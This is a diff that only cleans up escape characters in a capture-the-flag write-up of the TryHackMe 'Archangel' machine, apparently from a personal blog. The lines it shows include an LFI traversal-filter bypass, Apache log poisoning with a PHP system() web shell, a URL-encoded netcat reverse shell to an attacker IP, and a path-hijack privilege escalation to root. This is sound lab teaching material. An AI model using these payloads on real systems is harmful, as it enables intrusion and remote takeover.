@@ -77,7 +77,7 @@ Before performing any kind of enumeration, it is essential to start with port en
 We can enumerate the ports of the machine with nmap -sC (default scripts) \-sV (version detection).
 
 {% highlight bash %}
-\# Nmap 7.91 scan initiated Sat May  1 01:38:36 2021 as: nmap -sC -sV -oA nmap/nmap 10.10.72.16
+# Nmap 7.91 scan initiated Sat May  1 01:38:36 2021 as: nmap -sC -sV -oA nmap/nmap 10.10.72.16
 
 Nmap scan report for archangel.thm (10.10.72.16)
 
@@ -95,15 +95,15 @@ PORT   STATE SERVICE VERSION
 
 |   256 63:73:27:c7:61:04:25:6a:08:70:7a:36:b2:f2:84:0d (ECDSA)
 
-|\_  256 b6:4e:d2:9c:37:85:d6:76:53:e8:c4:e0:48:1c:ae:6c (ED25519)
+|_  256 b6:4e:d2:9c:37:85:d6:76:53:e8:c4:e0:48:1c:ae:6c (ED25519)
 
 80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
 
-|\_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-server-header: Apache/2.4.29 (Ubuntu)
 
-|\_http-title: Wavefire
+|_http-title: Wavefire
 
-Service Info: OS: Linux; CPE: cpe:/o:linux:linux\_kernel
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 {% endhighlight %}
 
 The nmap scan only detected two open ports (ssh on port 22 and http on port 80). Both services are up to date, so there are no CVEs (Common Vulnerabilities and Exposures) associated with them.
@@ -136,7 +136,7 @@ The website seems to be a simple HTTP server. There may be some interesting file
 
 Gobuster v3.0.1
 
-by OJ Reeves (@TheColonial) & Christian Mehlmauer (@\_FireFart\_)
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
 
 \===============================================================
 
@@ -185,7 +185,7 @@ We can verify this by seeing if we can convert the PHP file to base64 in order t
 
 URL:
 
-http://mafialive.thm/test.php?view=php://filter/convert.base64-encode/resource=/var/www/html/development\_testing/mrrobot.php
+http://mafialive.thm/test.php?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/mrrobot.php
 
 Output:
 
@@ -202,7 +202,7 @@ Although we were able to verify the LFI vulnerability by converting the mrrobot.
 
 URL:
 
-http://mafialive.thm/test.php?view=/var/www/html/development\_testing/mrrobot.php/../../../../../../../etc/passwd
+http://mafialive.thm/test.php?view=/var/www/html/development_testing/mrrobot.php/../../../../../../../etc/passwd
 
 Output:
 
@@ -224,8 +224,8 @@ After decoding the base64 data, we are met with the contents of the test.php fil
 <!DOCTYPE HTML>  
 <html>  
   
-<head>   <title>INCLUDE</title>   <h1>Test Page. Not to be Deployed</h1>   </button></a> <a href="/test.php?view=/var/www/html/development\_testing/mrrobot.php"\><button id="secret"\>Here is a button</button></a><br>       <?php            //FLAG: thm{explo1t1ng\_lf1}           function containsStr($str, $substr) {               return strpos($str, $substr) !== false;  
-           }            if(isset($\_GET\["view"\])){            if(!containsStr($\_GET\['view'\], '../..') && containsStr($\_GET\['view'\], '/var/www/html/development\_testing')) {                   include $\_GET\['view'\];  
+<head>   <title>INCLUDE</title>   <h1>Test Page. Not to be Deployed</h1>   </button></a> <a href="/test.php?view=/var/www/html/development_testing/mrrobot.php"\><button id="secret"\>Here is a button</button></a><br>       <?php            //FLAG: thm{explo1t1ng_lf1}           function containsStr($str, $substr) {               return strpos($str, $substr) !== false;  
+           }            if(isset($_GET\["view"\])){            if(!containsStr($_GET\['view'\], '../..') && containsStr($_GET\['view'\], '/var/www/html/development_testing')) {                   include $_GET\['view'\];  
            }else{                echo 'Sorry, Thats not allowed';  
            }  
         }       ?>   </div>  
@@ -234,11 +234,11 @@ After decoding the base64 data, we are met with the contents of the test.php fil
 </html>
 {% endhighlight %}
 
-We can see that the PHP file is looking for the strings “../..” and /var/www/html/devleopment\_testing exist in the URL . More precisely, if there is a “../..” string in the URL or the URL does not have /var/www/html/development\_testing, then the detection will trigger. We can bypass this by using “..//..” which functions just like “../..”.
+We can see that the PHP file is looking for the strings “../..” and /var/www/html/devleopment_testing exist in the URL . More precisely, if there is a “../..” string in the URL or the URL does not have /var/www/html/development_testing, then the detection will trigger. We can bypass this by using “..//..” which functions just like “../..”.
 
 URL:
 
-http://mafialive.thm/test.php?view=/var/www/html/development\_testing/..//..//..//..//..//..//etc/passwd
+http://mafialive.thm/test.php?view=/var/www/html/development_testing/..//..//..//..//..//..//etc/passwd
 
 Output:
 
@@ -273,7 +273,7 @@ Seeing as the log file outputs the PHP info, we can conclude that the malicious 
 {% highlight bash %}
 ┌─\[✗\]─\[0xd4y@Writeup\]─\[~/business/tryhackme/easy/linux/archangel\]  
 └──╼ $nc mafialive.thm 80  
-GET /<?php system($\_GET\['cmd'\]);?>  
+GET /<?php system($_GET\['cmd'\]);?>  
 HTTP/1.1 400 Bad Request  
 Date: Sat, 01 May 2021 02:34:25 GMT  
 Server: Apache/2.4.29 (Ubuntu)  
@@ -297,7 +297,7 @@ We can now get a reverse shell by sending the following payload:
 
 Payload:
 
-http://mafialive.thm/test.php?view=/var/www/html/development\_testing/..//..//..//..//..//..//..//var/log/apache2/access.log&cmd=rm+%2Ftmp%2Ff%3Bmkfifo+%2Ftmp%2Ff%3Bcat+%2Ftmp%2Ff|%2Fbin%2Fsh+-i+2%3E%261|nc+10.2.29.238+9001+%3E%2Ftmp%2Ff
+http://mafialive.thm/test.php?view=/var/www/html/development_testing/..//..//..//..//..//..//..//var/log/apache2/access.log&cmd=rm+%2Ftmp%2Ff%3Bmkfifo+%2Ftmp%2Ff%3Bcat+%2Ftmp%2Ff|%2Fbin%2Fsh+-i+2%3E%261|nc+10.2.29.238+9001+%3E%2Ftmp%2Ff
 
 Note that a url-encoded netcat reverse shell was used  
 
@@ -315,7 +315,7 @@ www-data@ubuntu:/home/archangel$ find / -user archangel 2>/dev/null
 /opt/helloworld.sh  
 /opt/backupfiles  
 /home/archangel  
-/home/archangel/.selected\_editor  
+/home/archangel/.selected_editor  
 /home/archangel/.local  
 /home/archangel/.local/share  
 /home/archangel/.profile  
@@ -323,7 +323,7 @@ www-data@ubuntu:/home/archangel$ find / -user archangel 2>/dev/null
 /home/archangel/user.txt  
 /home/archangel/myfiles  
 /home/archangel/.cache  
-/home/archangel/.bash\_logout  
+/home/archangel/.bash_logout  
 /home/archangel/.bashrc
 {% endhighlight %}
 
@@ -342,16 +342,16 @@ Furthermore, we can see from /etc/crontab that there is a cronjob executing it 
 
 {% highlight bash %}
 www-data@ubuntu:/opt$ cat /etc/crontab  
-\# /etc/crontab: system-wide crontab  
-\# Unlike any other crontab you don't have to run the \`crontab'  
-\# command to install the new version when you edit this file  
-\# and files in /etc/cron.d. These files also have username fields,  
-\# that none of the other crontabs do.  
+# /etc/crontab: system-wide crontab  
+# Unlike any other crontab you don't have to run the \`crontab'  
+# command to install the new version when you edit this file  
+# and files in /etc/cron.d. These files also have username fields,  
+# that none of the other crontabs do.  
   
 SHELL=/bin/sh  
 PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin  
   
-\# m h dom mon dow user  command  
+# m h dom mon dow user  command  
 \*/1 \*   \* \* \*   archangel /opt/helloworld.sh17 \*    \* \* \*   root    cd / && run-parts \--report /etc/cron.hourly25 6    \* \* \*   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )47 6    \* \* 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )52 6    1 \* \*   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )  
 #
 {% endhighlight %}
@@ -432,7 +432,7 @@ Now when we execute the backup binary, it will run our malicious file instead of
 
 {% highlight bash %}
 archangel@ubuntu:~/secret$ ./backup  
-root@ubuntu:~/secret\# id  
+root@ubuntu:~/secret# id  
 uid=0(root) gid=0(root) groups=0(root),1001(archangel)
 {% endhighlight %}
 
@@ -464,4 +464,4 @@ It is highly encouraged that the system be patched as soon as possible with the 
 
 [\[3\]](#ftnt_ref3) [https://github.com/NationalSecurityAgency/ghidra](https://www.google.com/url?q=https://github.com/NationalSecurityAgency/ghidra&sa=D&source=editors&ust=1653795832279536&usg=AOvVaw0poo_jDK2AMc-8bKRwapo3) 
 
-[\[4\]](#ftnt_ref4) [https://owasp.org/www-community/attacks/Command\_Injection](https://www.google.com/url?q=https://owasp.org/www-community/attacks/Command_Injection&sa=D&source=editors&ust=1653795832279759&usg=AOvVaw1S6mvU5d9Uujc94ekfUZTm)
+[\[4\]](#ftnt_ref4) [https://owasp.org/www-community/attacks/Command_Injection](https://www.google.com/url?q=https://owasp.org/www-community/attacks/Command_Injection&sa=D&source=editors&ust=1653795832279759&usg=AOvVaw1S6mvU5d9Uujc94ekfUZTm)
